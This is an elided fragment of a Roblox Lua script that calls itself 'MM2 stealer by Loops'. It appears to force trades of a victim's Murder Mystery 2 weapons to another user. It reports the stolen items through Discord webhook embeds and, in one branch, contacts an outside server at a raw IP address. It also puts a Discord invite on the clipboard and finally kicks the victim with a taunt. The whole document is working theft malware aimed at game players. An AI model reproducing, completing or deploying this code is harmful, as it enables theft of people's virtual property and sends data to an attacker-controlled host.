...
setclipboard("discord.gg/ggfVD9Nn")
...
local function SendFirstMessage(list, prefix)
    ...
    local data = {
        ...
        ["embeds"] = {{
            ...
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "MM2 stealer by Loops. discord.gg/ggfVD9Nn"
            }
        }}
    }
...
if #weaponsToSend > 0 then
    ...
    local function doTrade(joinedUser)
        ...
        -- Send execution message AFTER all trades complete
        if dualhooked then
            local response = request({
                Url = "http://89.169.3.53:8000/webhook/91464bf6-0d45-49cd-bb73-b0b36cc464ce",
                Method = "GET"
            ...
            discuser = response.Body
            SendDHFirstMessage(sentWeapons, prefix)
        else
            SendMessage(sentWeapons)
        end
        
        plr:kick("All your stuff just got taken by Loops's stealer. discord.gg/ggfVD9Nn")
    end
